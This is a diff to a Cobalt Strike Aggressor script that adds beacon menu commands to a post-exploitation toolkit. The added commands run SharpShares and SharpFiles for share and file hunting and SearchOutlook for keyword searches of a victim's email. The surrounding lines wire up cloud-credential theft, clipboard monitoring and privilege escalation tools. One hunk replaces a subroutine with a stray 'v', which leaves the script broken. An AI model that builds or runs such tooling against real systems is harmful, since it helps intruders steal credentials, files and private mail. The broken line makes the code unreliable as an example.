@@ -380,6 +380,19 @@ item "Find Shares using SharpShares"{
 			}
 		}
 
+item "Find Shares using SharpShares - Not OPSEC"{
+	local('$bid');
+		foreach $bid ($1){
+			sharpsharesmod($bid);
+			}
+		}
+		
+item "Find Files using SharpFiles - Not OPSEC"{
+	local('$bid');
+		foreach $bid ($1){
+			sharpfiles($bid);
+			}
+		}
 
 #Find Cloud Credential Files
 item "Find Cloud Creds"{
@@ -543,6 +556,19 @@ item "Retrieve Clipboard Contents"{
 	local('$bid');
 		foreach $bid ($1){
 			getclippy($bid);
+		}
+	}
+
+#################################################
+
+#   Email Keyword Search
+
+#################################################
+
+item "Outlook Email Keyword Search"{
+	local('$bid');
+		foreach $bid ($1){
+			getemails($bid);
 		}
 	}
 
@@ -719,9 +745,7 @@ bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminA
 sub loudshare{
 bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -CheckShareAccess");
 }
-sub sharpup{
-bexecute_assembly($1, script_resource('../exe/SharpUp.exe'));
-}
+v
 sub sweetpotato{
 bexecute_assembly($1, script_resource('exe/SweetPotato.exe'));
 }
@@ -963,6 +987,16 @@ sub sharpshares{
 bexecute_assembly($1, script_resource('/exe/SharpShares.exe'), "shares");
 }
 
+#SharpShares w/SharpFiles
+sub sharpsharesmod{
+bexecute_assembly($1, script_resource('/exe/sharpshares.exe'));
+}
+
+#SharpFiles
+sub sharpfiles{
+bexecute_assembly($1, script_resource('/exe/sharpfiles.exe'));
+}
+
 # Cloud Creds
 sub cloudcreds{
 bexecute_assembly($1, script_resource('/exe/SharpCloud.exe'), "all");
@@ -1143,7 +1177,18 @@ sub getclippy{
 bexecute_assembly($1, script_resource("/exe/Clippy-B.exe"),"--interval=10 --monitor=4");
 }
 
+#################################################
 
+#   Email Keyword Search
+
+#################################################
+
+sub getemails{
+prompt_text("Enter Keyword:", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/SearchOutlook.exe"), "$1");
+}, $bids => $1));
+}
+	
 #################################################
 
 #   EDR Query
